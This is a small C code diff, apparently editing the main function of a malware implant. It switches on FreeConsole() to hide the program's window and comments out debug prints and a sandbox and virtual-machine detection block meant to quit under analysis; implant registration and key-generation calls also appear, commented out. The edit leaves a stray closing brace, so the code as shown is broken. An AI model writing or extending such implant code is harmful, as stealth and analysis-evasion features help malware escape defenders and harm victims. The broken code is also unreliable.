@@ -55,19 +55,19 @@ BOOL CheckInstance(){
 }
 
 int main(int argc, char* argv[]){
-    //FreeConsole();
+    FreeConsole();
     /* Registering Implant */
     //registerimplant();
 
     /* Sandbox Detection */
-    // printf("Executing Sandbox Detection\n");
-    // if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
-        printf("TROLLOLOOOLL\n");
-    //     exit(0);
-    // }
+     //printf("Executing Sandbox Detection\n");
+     //if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
+       // 
+    //  exit(0);
+    }
 
     //char * GlobalKey = newsymkey();
-    printf("NOTHING SUSPICIOUS HERE\n");
+    //printf("NOTHING SUSPICIOUS HERE\n");
     
 
 
